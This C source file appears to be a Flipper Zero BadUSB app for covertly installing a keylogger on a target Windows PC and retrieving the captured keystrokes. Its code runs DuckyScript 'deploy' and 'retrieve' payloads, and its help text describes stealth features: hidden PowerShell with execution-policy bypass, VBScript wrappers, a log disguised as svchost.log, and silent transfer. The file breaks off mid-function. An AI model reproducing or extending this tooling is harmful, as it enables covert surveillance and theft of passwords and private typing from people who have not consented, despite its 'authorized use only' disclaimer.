#include "keylogger_app.h"
#include "progress_view.h"
#include "success_failure_view.h"
#include "help_view.h"
#include "file_viewer_view.h"
#include "keylog_browser_view.h"
#include "payload_manager.h"

#include <furi_hal.h>
#include <furi_hal_usb.h>
#include <furi_hal_usb_hid.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <dialogs/dialogs.h>
#include <gui/modules/dialog_ex.h>
#include <storage/storage.h>
#include <toolbox/path.h>
#include <loader/loader.h>

#define TAG                       "KeyloggerApp"
#define PRIMARY_PAYLOAD_EXTENSION ".txt"
#define PAYLOAD_DIR               "/ext/apps_data/keylogger/payloads"

// Custom event for deferred file loading
#define KeyloggerEventSetInitialView 0x1001
#define KeyloggerEventFileViewerInit 0x1002
#define KeyloggerEventExit           0x1003

// --- Forward declarations for callbacks ---
void keylogger_preparation_submenu_callback(void* context, uint32_t index);
void keylogger_success_failure_callback(void* context);
void keylogger_file_selected_for_view_callback(void* context, const char* file_path);
void keylogger_update_preparation_menu_labels(KeyloggerApp* app);
void keylogger_app_free(KeyloggerApp* app); // Forward declaration

// --- Callback Wrappers for SuccessFailureView ---
// Wrapper callback for SuccessFailureView's "OK" (center) button
static void app_success_failure_ok_btn_callback(void* context) {
    keylogger_success_failure_callback(context);
}

// --- Progress View Status Update Wrapper ---
static void app_progress_set_status(void* context, const char* status) {
    KeyloggerApp* app = context;
    if(app && app->progress_view && status) {
        progress_view_set_status(app->progress_view, status);
    }
}

// --- Enhanced File Browser Logic ---
bool keylogger_show_enhanced_file_browser(
    KeyloggerApp* app,
    const char* title,
    const char* extension) {
    if(!app || !app->dialogs) {
        FURI_LOG_E(TAG, "Invalid app state for file selection");
        return false;
    }

    // Ensure payload directory exists
    Storage* storage = furi_record_open(RECORD_STORAGE);
    FileInfo dir_info;
    if(storage_common_stat(storage, PAYLOAD_DIR, &dir_info) != FSE_OK ||
       !file_info_is_dir(&dir_info)) {
        storage_simply_mkdir(storage, PAYLOAD_DIR);
        FURI_LOG_I(TAG, "Created payload directory: %s", PAYLOAD_DIR);
    }
    furi_record_close(RECORD_STORAGE);

    // Use dialogs API for file selection with enhanced options
    FuriString* selected_file = furi_string_alloc();
    furi_string_set_str(selected_file, PAYLOAD_DIR);

    DialogsFileBrowserOptions browser_options;
    dialog_file_browser_set_basic_options(&browser_options, extension, NULL);
    browser_options.base_path = PAYLOAD_DIR;
    browser_options.hide_dot_files = true;

    FURI_LOG_I(
        TAG, "Opening %s for primary payload selection (supports %s files)...", title, extension);

    bool file_selected =
        dialog_file_browser_show(app->dialogs, selected_file, selected_file, &browser_options);

    if(file_selected && !furi_string_empty(selected_file)) {
        // Validate file exists and is readable
        Storage* validation_storage = furi_record_open(RECORD_STORAGE);
        FileInfo file_info;
        if(storage_common_stat(
               validation_storage, furi_string_get_cstr(selected_file), &file_info) == FSE_OK) {
            furi_string_set(app->primary_payload_path, selected_file);
            FURI_LOG_I(
                TAG,
                "Primary payload selected: %s (size: %llu bytes)",
                furi_string_get_cstr(selected_file),
                file_info.size);

            // Update menu labels
            keylogger_update_preparation_menu_labels(app);
            furi_record_close(RECORD_STORAGE);
            furi_string_free(selected_file);
            return true;
        } else {
            FURI_LOG_E(
                TAG, "Selected file is not accessible: %s", furi_string_get_cstr(selected_file));
            furi_record_close(RECORD_STORAGE);
        }
    } else {
        FURI_LOG_D(TAG, "No file selected or selection cancelled");
    }

    furi_string_free(selected_file);
    return false;
}

void keylogger_show_file_browser(KeyloggerApp* app) {
    keylogger_show_enhanced_file_browser(
        app,
        "Payload Browser",
        "*" // Accept all file types - the payload manager will auto-detect format
    );
}

// --- Lazy Loading Helper Functions ---
static bool keylogger_ensure_file_views_allocated(KeyloggerApp* app) {
    // Allocate file viewer view if needed
    if(!app->file_viewer_view) {
        FURI_LOG_I(TAG, "Lazy loading file viewer view...");
        app->file_viewer_view = file_viewer_view_alloc();
        if(!app->file_viewer_view) {
            FURI_LOG_E(TAG, "Failed to lazy load file viewer view");
            return false;
        }

        // Set up file selection callback
        file_viewer_view_set_file_selected_callback(
            app->file_viewer_view, keylogger_file_selected_for_view_callback, app);

        // Add to dispatcher
        view_dispatcher_add_view(
            app->view_dispatcher,
            KeyloggerViewFileViewer,
            file_viewer_view_get_view(app->file_viewer_view));
        FURI_LOG_I(TAG, "File viewer view lazy loaded and added to dispatcher");
    }

    // Allocate keylog browser view if needed
    if(!app->keylog_browser_view) {
        FURI_LOG_I(TAG, "Lazy loading keylog browser view...");
        app->keylog_browser_view = keylog_browser_view_alloc();
        if(!app->keylog_browser_view) {
            FURI_LOG_E(TAG, "Failed to lazy load keylog browser view");
            return false;
        }

        // Add to dispatcher
        view_dispatcher_add_view(
            app->view_dispatcher,
            KeyloggerViewKeylogBrowser,
            keylog_browser_view_get_view(app->keylog_browser_view));
        FURI_LOG_I(TAG, "Keylog browser view lazy loaded and added to dispatcher");
    }

    return true;
}

// --- Preparation View (Submenu) Callbacks and Setup ---
typedef enum {
    PreparationSubmenuIndexModeSelect,
    PreparationSubmenuIndexPayload,
    PreparationSubmenuIndexExecute,
    PreparationSubmenuIndexViewKeylogs,
    PreparationSubmenuIndexHelp,
    PreparationSubmenuIndexExit,
} PreparationSubmenuIndex;

typedef enum {
    OperationModeDeploy,
    OperationModeRetrieve,
    OperationModeCustom,
} OperationMode;

void keylogger_update_preparation_menu_labels(KeyloggerApp* app) {
    if(!app || !app->preparation_submenu) {
        FURI_LOG_E(TAG, "Invalid app state for menu update");
        return;
    }

    Submenu* submenu = app->preparation_submenu;

    // Update mode selection label
    const char* mode_labels[] = {"Deploy Keylogger", "Retrieve Data", "Custom Mode"};
    FuriString* mode_label = furi_string_alloc();
    furi_string_printf(mode_label, "Mode: %s", mode_labels[app->operation_mode]);
    submenu_change_item_label(
        submenu, PreparationSubmenuIndexModeSelect, furi_string_get_cstr(mode_label));
    furi_string_free(mode_label);

    // Update payload label
    FuriString* payload_label = furi_string_alloc();
    if(furi_string_size(app->primary_payload_path) > 0) {
        FuriString* filename = furi_string_alloc();
        path_extract_filename(app->primary_payload_path, filename, true);
        furi_string_printf(payload_label, "Payload: %s", furi_string_get_cstr(filename));
        furi_string_free(filename);
    } else {
        // Auto-select based on mode
        switch(app->operation_mode) {
        case OperationModeDeploy:
            furi_string_set_str(payload_label, "Payload: deploy_keylogger.txt");
            break;
        case OperationModeRetrieve:
            furi_string_set_str(payload_label, "Payload: retrieve_keylog.txt");
            break;
        default:
            furi_string_set_str(payload_label, "Payload: [None Selected]");
            break;
        }
    }
    submenu_change_item_label(
        submenu, PreparationSubmenuIndexPayload, furi_string_get_cstr(payload_label));
    furi_string_free(payload_label);
}

// --- Worker Thread for Execution Logic ---
typedef struct {
    KeyloggerApp* app;
    FuriThread* thread;
} ExecutionContext;

static int32_t keylogger_execution_thread(void* context) {
    ExecutionContext* exec_ctx = context;
    KeyloggerApp* app = exec_ctx->app;
    bool primary_success = false;

    FURI_LOG_I(TAG, "Worker thread started for payload execution");

    // Execute DuckyScript using existing payload manager
    const char* file_path = furi_string_get_cstr(app->primary_payload_path);
    FURI_LOG_I(TAG, "Executing DuckyScript payload: %s", file_path);

    payload_manager_set_primary_payload_path(app->payload_manager, file_path);
    primary_success = payload_manager_execute_primary_phase(
        app->payload_manager, true, app_progress_set_status, app);

    if(progress_view_is_running(app->progress_view)) {
        // Store results for later retrieval by main thread - no GUI operations
        app->execution_completed = true;
        app->execution_success = primary_success;
        app->execution_partial_success = false;

        // Send custom event to trigger view transition from main thread
        view_dispatcher_send_custom_event(
            app->view_dispatcher,
            app->execution_success ? KeyloggerEventSuccessView : KeyloggerEventFailureView);
    }

    FURI_LOG_I(TAG, "Worker thread execution completed");

    // USB cleanup from worker thread
    if(app->payload_manager) {
        FURI_LOG_I(TAG, "Worker thread performing USB cleanup...");
        payload_manager_cleanup(app->payload_manager);
        furi_delay_ms(500); // Additional delay for USB to stabilize
    }

    // Mark thread as completed so main thread can safely clean it up
    app->execution_thread_completed = true;
    FURI_LOG_I(TAG, "Worker thread marked as completed");

    // Clean up execution context
    free(exec_ctx);
    return 0;
}

void keylogger_preparation_submenu_callback(void* context, uint32_t index) {
    KeyloggerApp* app = context;
    if(!app) {
        FURI_LOG_E(TAG, "NULL app context in submenu callback");
        return;
    }

    switch(index) {
    case PreparationSubmenuIndexModeSelect:
        // Cycle through operation modes
        app->operation_mode = (app->operation_mode + 1) % 3; // 0=Deploy, 1=Retrieve, 2=Custom

        // Auto-load appropriate payloads for Deploy/Retrieve modes (DuckyScript .txt files)
        if(app->operation_mode == OperationModeDeploy) {
            furi_string_printf(app->primary_payload_path, "%s/deploy_keylogger.txt", PAYLOAD_DIR);
            FURI_LOG_I(TAG, "Deploy mode selected - auto-loaded DuckyScript payload");
        } else if(app->operation_mode == OperationModeRetrieve) {
            furi_string_printf(app->primary_payload_path, "%s/retrieve_keylog.txt", PAYLOAD_DIR);
            FURI_LOG_I(TAG, "Retrieve mode selected - auto-loaded DuckyScript payload");
        } else {
            // Custom mode - clear auto-selections
            furi_string_reset(app->primary_payload_path);
            FURI_LOG_I(TAG, "Custom mode selected - cleared auto-selections");
        }

        keylogger_update_preparation_menu_labels(app);
        break;
    case PreparationSubmenuIndexPayload:
        FURI_LOG_D(TAG, "Payload file browser opened");
        keylogger_show_file_browser(app);
        break;
    case PreparationSubmenuIndexExecute:
        // Worker thread execution to prevent GUI blocking
        if(!app->success_failure_view || !app->progress_view) {
            FURI_LOG_E(TAG, "Views not available for execution");
            break;
        }

        // ENHANCED LOCKUP PREVENTION: Force complete state reset
        FURI_LOG_I(TAG, "Starting execution - performing complete state reset...");

        // STEP 1: Stop any running progress view
        if(app->progress_view) {
            progress_view_set_force_stop(app->progress_view);
            progress_view_reset(app->progress_view);
            FURI_LOG_I(TAG, "Progress view stopped and reset");
        }

        // STEP 2: Force cleanup any existing execution thread
        if(app->execution_thread) {
            FURI_LOG_W(TAG, "Previous execution thread exists! Force cleaning up...");

            // Force join with timeout to prevent infinite wait
            FuriThreadState thread_state = furi_thread_get_state(app->execution_thread);
            if(thread_state == FuriThreadStateRunning || thread_state == FuriThreadStateStarting) {
                FURI_LOG_W(TAG, "Force joining running thread...");
                furi_thread_join(app->execution_thread);
            }

            // Free the thread
            furi_thread_free(app->execution_thread);
            app->execution_thread = NULL;
            app->execution_thread_completed = false;

            FURI_LOG_I(TAG, "Previous execution thread forcefully cleaned up");
        }

        // STEP 3: Reset all execution state flags
        app->execution_completed = false;
        app->execution_success = false;
        app->execution_partial_success = false;
        app->execution_thread_completed = false;
        FURI_LOG_I(TAG, "Execution state flags reset");

        // STEP 4: USB state cleanup with extended delays
        if(app->payload_manager) {
            FURI_LOG_I(TAG, "Performing thorough USB state cleanup...");
            payload_manager_cleanup(app->payload_manager);

            // Extended delays for USB stabilization
            furi_delay_ms(1500);
            FURI_LOG_I(TAG, "USB cleanup completed, waiting for stabilization...");
            furi_delay_ms(1000);
        }

        FURI_LOG_I(TAG, "State reset complete - starting payload execution...");

        // Check if we have a payload - auto-select if in Deploy/Retrieve mode
        if(furi_string_empty(app->primary_payload_path)) {
            // Auto-select based on mode
            switch(app->operation_mode) {
            case OperationModeDeploy:
                furi_string_printf(
                    app->primary_payload_path, "%s/deploy_keylogger.txt", PAYLOAD_DIR);
                FURI_LOG_I(TAG, "Auto-selected deploy payload");
                break;
            case OperationModeRetrieve:
                furi_string_printf(
                    app->primary_payload_path, "%s/retrieve_keylog.txt", PAYLOAD_DIR);
                FURI_LOG_I(TAG, "Auto-selected retrieve payload");
                break;
            default:
                success_failure_view_set_params(
                    app->success_failure_view,
                    SuccessFailureModeFailure,
                    "No payload selected!\n\nPlease select a payload first.",
                    NULL,
                    NULL,
                    "OK",
                    app_success_failure_ok_btn_callback,
                    NULL,
                    NULL,
                    app);
                view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewSuccess);
                app->current_view_id = KeyloggerViewSuccess;
                break;
            }
        }

        // Validate the payload file exists
        if(!furi_string_empty(app->primary_payload_path)) {
            Storage* validation_storage = furi_record_open(RECORD_STORAGE);
            FileInfo file_info;
            if(storage_common_stat(
                   validation_storage,
                   furi_string_get_cstr(app->primary_payload_path),
                   &file_info) != FSE_OK) {
                furi_record_close(RECORD_STORAGE);

                FuriString* filename = furi_string_alloc();
                path_extract_filename(app->primary_payload_path, filename, true);

                FuriString* error_msg = furi_string_alloc();
                furi_string_printf(
                    error_msg,
                    "Payload file not found:\n%s\n\nPlease check the file exists in:\n/ext/apps_data/keylogger/payloads/\n\nRun upload_payload.bat to copy\nfiles to Flipper SD card.",
                    furi_string_get_cstr(filename));

                success_failure_view_set_params(
                    app->success_failure_view,
                    SuccessFailureModeFailure,
                    furi_string_get_cstr(error_msg),
                    NULL,
                    NULL,
                    "OK",
                    app_success_failure_ok_btn_callback,
                    NULL,
                    NULL,
                    app);
                view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewSuccess);
                app->current_view_id = KeyloggerViewSuccess;

                furi_string_free(filename);
                furi_string_free(error_msg);
                break;
            }
            furi_record_close(RECORD_STORAGE);
            FURI_LOG_I(
                TAG,
                "Payload file validated: %s",
                furi_string_get_cstr(app->primary_payload_path));
        }

        // Switch to progress view
        progress_view_set_status(
            app->progress_view,
            "Executing payload...\n\nThis may take several minutes.\nPress Back to cancel.");
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewProgress);
        app->current_view_id = KeyloggerViewProgress;

        // Create execution context and start worker thread
        ExecutionContext* exec_ctx = malloc(sizeof(ExecutionContext));
        if(!exec_ctx) {
            FURI_LOG_E(TAG, "Failed to allocate execution context");
            app_progress_set_status(app, "Error: Memory allocation failed");
            break;
        }

        exec_ctx->app = app;
        exec_ctx->thread =
            furi_thread_alloc_ex("KeystrokeExec", 8192, keylogger_execution_thread, exec_ctx);

        if(!exec_ctx->thread) {
            FURI_LOG_E(TAG, "Failed to allocate worker thread");
            app_progress_set_status(app, "Error: Thread allocation failed");
            free(exec_ctx);
            break;
        }

        // Store thread reference in app for cleanup
        app->execution_thread = exec_ctx->thread;

        furi_thread_start(exec_ctx->thread);
        FURI_LOG_I(TAG, "Worker thread started for execution");
        break;
    case PreparationSubmenuIndexViewKeylogs:
        // Browse and view keylog files - LAZY LOADED
        FURI_LOG_D(TAG, "View Keylogs selected - lazy loading file views...");

        // Ensure file views are allocated
        if(!keylogger_ensure_file_views_allocated(app)) {
            FURI_LOG_E(TAG, "Failed to allocate file views");
            break;
        }

        // Set up our custom browser for the keylogs directory
        keylog_browser_view_set_directory(
            app->keylog_browser_view, "/ext/apps_data/keylogger/keylogs");
        keylog_browser_view_set_file_selected_callback(
            app->keylog_browser_view, keylogger_file_selected_for_view_callback, app);

        // Switch to our custom browser view
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewKeylogBrowser);
        app->current_view_id = KeyloggerViewKeylogBrowser;

        FURI_LOG_D(TAG, "View Keylogs completed");
        break;
    case PreparationSubmenuIndexHelp:
        if(!app->help_view) {
            FURI_LOG_E(TAG, "Help view not initialized");
            break;
        }
        help_view_set_text(
            app->help_view,
            "🎯 QUICK START:\n"
            "1. Connect to target PC\n"
            "2. Select Deploy Mode\n"
            "3. Press Execute (< 60 sec)\n"
            "4. Wait for keystroke activity\n"
            "5. Select Retrieve Mode\n"
            "6. Press Execute (< 60 sec)\n"
            "7. View captured data\n\n"

            "🔧 OPERATION MODES:\n"
            "• Deploy: Install silent keylogger\n"
            "• Retrieve: Get data & transfer\n"
            "• Custom: Manual payload selection\n\n"

            "📁 PAYLOADS:\n"
            "• deploy_keylogger.txt\n"
            "  Installs completely hidden keylogger\n"
            "• retrieve_keylog.txt\n"
            "  Gets data with invisible transfer\n\n"

            "💾 DATA STORAGE:\n"
            "Target: %TEMP%\\svchost.log\n"
            "Flipper: /ext/apps_data/keylogger/keylogs/\n"
            "Auto-timestamped files\n\n"

            "🛠️ DUCKYSCRIPT SYNTAX:\n"
            "GUI r - Windows+R\n"
            "STRING text - Type text\n"
            "ENTER, TAB - Special keys\n"
            "DELAY ms - Wait time\n"
            "CTRL, ALT - Modifiers\n\n"

            "⚡ STEALTH FEATURES:\n"
            "• Completely silent execution\n"
            "• No visible windows or prompts\n"
            "• Hidden PowerShell operation\n"
            "• VBScript wrappers for invisibility\n"
            "• Background process (svchost)\n"
            "• Auto USB mode switching\n"
            "• Silent file transfer via UFBT\n"
            "• Self-cleaning scripts\n\n"

            "🔍 VIEWING KEYLOGS:\n"
            "Look for LARGE files:\n"
            "• 100KB+ = Real keystroke data\n"
            "• <1KB = Stub/empty files\n"
            "Select bigger files to see\n"
            "actual captured keystrokes\n"
            "Line wrapping shows full content\n\n"

            "⚠️ TROUBLESHOOTING:\n"
            "No keylog files?\n"
            "• Run Deploy payload first\n"
            "• Wait for user keyboard activity\n"
            "• Check target has PowerShell enabled\n"
            "• Verify admin permissions if needed\n\n"

            "PowerShell execution policy?\n"
            "• Payloads use -ep bypass flag\n"
            "• Forces execution policy bypass\n"
            "• Works on most Windows systems\n"
            "• No permanent policy changes\n\n"

            "Transfer issues?\n"
            "• Ensure UFBT is installed on target\n"
            "• Check Flipper USB connection\n"
            "• Wait for scheduled transfer task\n"
            "• Files saved locally if transfer fails\n\n"

            "Payload execution fails?\n"
            "• Check DuckyScript syntax errors\n"
            "• Verify payload files exist\n"
            "• Run upload_payload.bat first\n"
            "• Ensure target OS compatibility\n\n"

            "🔒 SECURITY & LEGAL:\n"
            "⚠️ AUTHORIZED USE ONLY ⚠️\n"
            "• Educational/testing purposes only\n"
            "• Obtain explicit written permission\n"
            "• Follow all local/federal laws\n"
            "• Clean up after testing\n"
            "• Report vulnerabilities responsibly\n\n"

            "🚀 ADVANCED FEATURES:\n"
            "• Persistent installation option\n"
            "• Automatic cleanup on retrieval\n"
            "• Timestamped data collection\n"
            "• Multiple target support\n"
            "• Real-time progress monitoring\n"
            "• Automatic error handling\n\n"

            "Navigation:\n"
            "↑↓ arrows or scroll to navigate\n"
            "← → arrows for pages\n"
            "Back button to exit help");
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewHelp);
        app->current_view_id = KeyloggerViewHelp;
        break;
    case PreparationSubmenuIndexExit:
        FURI_LOG_I(TAG, "Exit selected - posting exit event...");
        // Send custom event to handle exit properly
        view_dispatcher_send_custom_event(app->view_dispatcher, KeyloggerEventExit);
        break;
    }
}

void keylogger_success_failure_callback(void* context) {
    KeyloggerApp* app = context;
    if(!app || !app->view_dispatcher) {
        FURI_LOG_E(TAG, "Invalid app context in success failure callback");
        return;
    }

    // SAFE CLEANUP: Clean up thread in UI callback context (always safe)
    if(app->execution_thread && app->execution_thread_completed) {
        FURI_LOG_I(TAG, "Success/Failure callback: Cleaning up completed execution thread...");
        furi_thread_free(app->execution_thread);
        app->execution_thread = NULL;
        app->execution_thread_completed = false;
        FURI_LOG_I(TAG, "Thread cleanup completed in UI callback context");
    } else if(app->execution_thread && !app->execution_thread_completed) {
        FURI_LOG_W(TAG, "Thread exists but not completed - signaling stop and joining...");
        if(app->progress_view) {
            progress_view_set_force_stop(app->progress_view);
        }
        furi_thread_join(app->execution_thread);
        furi_thread_free(app->execution_thread);
        app->execution_thread = NULL;
        app->execution_thread_completed = false;
    } else {
        FURI_LOG_D(TAG, "No thread to clean up in success/failure callback");
    }

    // Always go back to preparation menu
    view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewPreparation);
    app->current_view_id = KeyloggerViewPreparation;
}

void keylogger_file_selected_for_view_callback(void* context, const char* file_path) {
    KeyloggerApp* app = context;
    if(!app || !file_path) {
        FURI_LOG_E(TAG, "Invalid parameters in file view callback");
        return;
    }

    FURI_LOG_I(TAG, "File selected: %s - storing path and posting event", file_path);

    // MOMENTUM FIRMWARE FIX: Do absolutely NOTHING except store path and post event
    // All file viewer configuration will happen in custom event handler

    // Store the selected file path
    furi_string_set_str(app->selected_file_path, file_path);

    // Post custom event to handle file viewer initialization
    view_dispatcher_send_custom_event(app->view_dispatcher, KeyloggerEventFileViewerInit);

    FURI_LOG_I(TAG, "File selection event posted");
}

bool keylogger_custom_event_callback(void* context, uint32_t event) {
    KeyloggerApp* app = context;
    bool consumed = false;

    FURI_LOG_I(TAG, "Custom event callback triggered with event: %lu", event);
    FURI_LOG_I(
        TAG,
        "Thread state: %s, Thread completed: %s",
        app->execution_thread ? "exists" : "null",
        app->execution_thread_completed ? "true" : "false");

    // SAFE approach: Don't free thread from event callback context
    // Just mark it for cleanup - the actual freeing will happen in UI callback
    if(app->execution_thread && app->execution_thread_completed &&
       (event == KeyloggerEventSuccessView || event == KeyloggerEventFailureView)) {
        FURI_LOG_I(TAG, "Custom event: Thread ready for cleanup (will be freed in UI callback)");
    } else if(app->execution_thread && !app->execution_thread_completed) {
        FURI_LOG_W(TAG, "Thread exists but not marked as completed - skipping cleanup");
    } else if(!app->execution_thread) {
        FURI_LOG_I(TAG, "No thread to clean up");
    }

    switch(event) {
    case KeyloggerEventSetInitialView:
        // Set up the initial view after the view dispatcher is running
        FURI_LOG_I(TAG, "Setting initial view to preparation menu");
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewPreparation);
        app->current_view_id = KeyloggerViewPreparation;
        consumed = true;
        break;

    case KeyloggerEventFileViewerInit:
        // Handle file viewer initialization completely outside GUI thread
        FURI_LOG_I(TAG, "Handling file viewer initialization in custom event handler");

        if(!furi_string_empty(app->selected_file_path)) {
            // Ensure file views are allocated first
            if(!keylogger_ensure_file_views_allocated(app)) {
                FURI_LOG_E(TAG, "Failed to allocate file views during initialization");
                break;
            }

            // Extract filename for display (safe string operations)
            FuriString* display_filename = furi_string_alloc();
            FuriString* temp_file_path =
                furi_string_alloc_set_str(furi_string_get_cstr(app->selected_file_path));
            path_extract_filename(temp_file_path, display_filename, true);
            furi_string_free(temp_file_path);

            // Configure file viewer for FILE MODE (safe - no GUI operations)
            file_viewer_view_set_file_content(
                app->file_viewer_view,
                furi_string_get_cstr(app->selected_file_path),
                furi_string_get_cstr(display_filename));

            furi_string_free(display_filename);

            // Now safe to switch to file viewer view
            view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewFileViewer);
            app->current_view_id = KeyloggerViewFileViewer;

            FURI_LOG_I(TAG, "File viewer initialization and view switch completed");

            // Clear the stored path
            furi_string_reset(app->selected_file_path);
        } else {
            // Check if we need to populate directory list instead
            FURI_LOG_I(TAG, "No file path set, checking if directory mode needed");

            // This would be for directory browsing mode
            // For now, we'll assume file mode is primary use case
            FURI_LOG_W(TAG, "Directory mode not implemented in custom event handler yet");
        }

        consumed = true;
        break;

    case KeyloggerEventSuccessView:
        // Automatically triggered when execution completes successfully
        FURI_LOG_I(TAG, "Auto-showing success result");

        // Check if this was a retrieve operation - if so, show special message
        if(app->operation_mode == OperationModeRetrieve) {
            FURI_LOG_I(TAG, "Retrieve operation completed - notifying user");

            success_failure_view_set_params(
                app->success_failure_view,
                SuccessFailureModeSuccess,
                "Retrieve Complete!\n\nTransfer script is running\nusing UFBT to copy keylog\nfiles from PC to Flipper.\n\nCheck /ext/apps_data/keylogger/\nkeylogs/ for captured data.\n\nNo USB mode switching needed -\nUFBT handles the transfer\nautomatically.",
                NULL,
                NULL,
                "OK",
                app_success_failure_ok_btn_callback,
                NULL,
                NULL,
                app);

        } else {
            // Normal success for deploy/custom operations
            success_failure_view_set_params(
                app->success_failure_view,
                SuccessFailureModeSuccess,
                "Success!\n\nPayload executed successfully.",
                NULL,
                NULL,
                "OK",
                app_success_failure_ok_btn_callback,
                NULL,
                NULL,
                app);
        }

        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewSuccess);
        app->current_view_id = KeyloggerViewSuccess;
        consumed = true;
        break;
    case KeyloggerEventFailureView:
        // Automatically triggered when execution fails - use same view as success
        FURI_LOG_I(TAG, "Auto-showing failure result");
        success_failure_view_set_params(
            app->success_failure_view,
            SuccessFailureModeFailure,
            "Execution Failed!\n\nCheck payload files and\nUSB connection.",
            NULL,
            NULL,
            "OK",
            app_success_failure_ok_btn_callback,
            NULL,
            NULL,
            app);
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewSuccess);
        app->current_view_id = KeyloggerViewSuccess;
        consumed = true;
        break;
    case KeyloggerEventExit:
        // Handle exit event
        FURI_LOG_I(TAG, "Exit event received - cleaning up and stopping app...");

        // Ensure all cleanup is done before stopping
        if(app->execution_thread) {
            FURI_LOG_I(TAG, "Stopping any running execution thread...");
            if(app->progress_view) {
                progress_view_set_force_stop(app->progress_view);
            }
            furi_thread_join(app->execution_thread);
            furi_thread_free(app->execution_thread);
            app->execution_thread = NULL;
        }

        if(app->payload_manager) {
            FURI_LOG_I(TAG, "Cleaning up payload manager...");
            payload_manager_cleanup(app->payload_manager);
        }

        // Now safely stop the view dispatcher
        view_dispatcher_stop(app->view_dispatcher);
        consumed = true;
        break;
    default:
        FURI_LOG_D(TAG, "Unhandled custom event: %lu", event);
        break;
    }
    return consumed;
}

bool keylogger_navigation_event_callback(void* context) {
    KeyloggerApp* app = context;
    if(!app || !app->view_dispatcher) {
        FURI_LOG_E(TAG, "Invalid app context in navigation callback");
        return false;
    }

    uint32_t current_view_id = app->current_view_id;
    FURI_LOG_D(TAG, "Navigation event for view: %lu", current_view_id);

    if(current_view_id == KeyloggerViewProgress) {
        // CRITICAL: Do NOT allow back button during execution
        // BadUSB operations must complete without interruption
        FURI_LOG_I(
            TAG, "Back button blocked during execution - BadUSB operations cannot be interrupted");
        return true; // Consume the back event, don't allow it
    } else if(current_view_id == KeyloggerViewFileViewer) {
        // Clean up temporary help file if it exists
        Storage* cleanup_storage = furi_record_open(RECORD_STORAGE);
        const char* temp_file_path = "/ext/apps_data/keylogger/temp_help.txt";
        if(storage_common_exists(cleanup_storage, temp_file_path)) {
            storage_common_remove(cleanup_storage, temp_file_path);
            FURI_LOG_I(TAG, "Cleaned up temporary help file");
        }
        furi_record_close(RECORD_STORAGE);

        // Go back to keylog browser instead of preparation menu
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewKeylogBrowser);
        app->current_view_id = KeyloggerViewKeylogBrowser;
        return true;
    } else if(current_view_id == KeyloggerViewKeylogBrowser) {
        // Go back to preparation menu from our custom browser
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewPreparation);
        app->current_view_id = KeyloggerViewPreparation;
        return true;
    } else if(current_view_id == KeyloggerViewHelp || current_view_id == KeyloggerViewSuccess) {
        // Handle both success and failure cases since they use the same view now
        view_dispatcher_switch_to_view(app->view_dispatcher, KeyloggerViewPreparation);
        app->current_view_id = KeyloggerViewPreparation;
        return true;
    } else if(current_view_id == KeyloggerViewPreparation) {
        // User is trying to exit the app from the main menu
        FURI_LOG_I(TAG, "Back button pressed from main menu - cleaning up before exit...");

        // Ensure all cleanup is done before allowing exit
        if(app->execution_thread) {
            FURI_LOG_I(TAG, "Stopping any running execution thread...");
            if(app->progress_view) {
                progress_view_set_force_stop(app->progress_view);
            }
            furi_thread_join(app->execution_thread);
            furi_thread_free(app->execution_thread);
            app->execution_thread = NULL;
        }

        if(app->payload_manager) {
            payload_manager_cleanup(app->payload_manager);
        }

        FURI_LOG_I(TAG, "Cleanup complete, allowing app to exit");
        return false; // Let the view dispatcher handle the actual exit
    }
    return false; // Let the view dispatcher handle default (e.g. stopping the app on back from first view)
}

KeyloggerApp* keylogger_app_alloc() {
    FURI_LOG_I(TAG, "Starting app allocation...");

    KeyloggerApp* app = malloc(sizeof(KeyloggerApp));
    if(!app) {
        FURI_LOG_E(TAG, "keylogger_app_alloc failed");
        return NULL;
    }
    FURI_LOG_I(TAG, "App structure allocated successfully");

    // Initialize all pointers to NULL first for safe cleanup
    memset(app, 0, sizeof(KeyloggerApp));
    FURI_LOG_I(TAG, "App structure memset complete");

    // Initialize all FuriStrings
    FURI_LOG_I(TAG, "Allocating FuriStrings...");
    app->primary_payload_path = furi_string_alloc();
    app->selected_file_path = furi_string_alloc();

    // Check if any FuriString allocation failed
    if(!app->primary_payload_path || !app->selected_file_path) {
        FURI_LOG_E(TAG, "Failed to allocate FuriStrings");
        keylogger_app_free(app);
        return NULL;
    }
    FURI_LOG_I(TAG, "All FuriStrings allocated successfully");

    // Initialize other members
    app->current_view_id = 0;
    app->execution_thread = NULL; // Initialize execution thread to NULL
    app->execution_thread_completed = false; // Initialize thread completion flag
    app->execution_completed = false;
    app->execution_success = false;
    app->execution_partial_success = false;
    app->operation_mode = OperationModeDeploy; // Default to Deploy mode

    FURI_LOG_I(TAG, "App allocation completed successfully");
    return app;
}

void keylogger_app_free(KeyloggerApp* app) {
    if(!app) {
        return; // Safe to call with NULL
    }

    FURI_LOG_I(TAG, "Starting app cleanup...");

    // Clean up any temporary files
    Storage* cleanup_storage = furi_record_open(RECORD_STORAGE);
    const char* temp_file_path = "/ext/apps_data/keylogger/temp_help.txt";
    if(storage_common_exists(cleanup_storage, temp_file_path)) {
        storage_common_remove(cleanup_storage, temp_file_path);
        FURI_LOG_I(TAG, "Cleaned up temporary help file during app exit");
    }
    furi_record_close(RECORD_STORAGE);

    // CRITICAL: Force stop and cleanup execution thread if running
    if(app->execution_thread) {
        FURI_LOG_I(TAG, "Force stopping execution thread during app cleanup...");

        // Force stop progress view to signal thread
        if(app->progress_view) {
            progress_view_set_force_stop(app->progress_view);
        }

        // Force join the thread regardless of state
        FuriThreadState thread_state = furi_thread_get_state(app->execution_thread);
        FURI_LOG_I(TAG, "Thread state during cleanup: %d", thread_state);

        if(thread_state == FuriThreadStateRunning || thread_state == FuriThreadStateStarting) {
            FURI_LOG_W(TAG, "Thread still running during cleanup, force joining...");
            furi_thread_join(app->execution_thread);
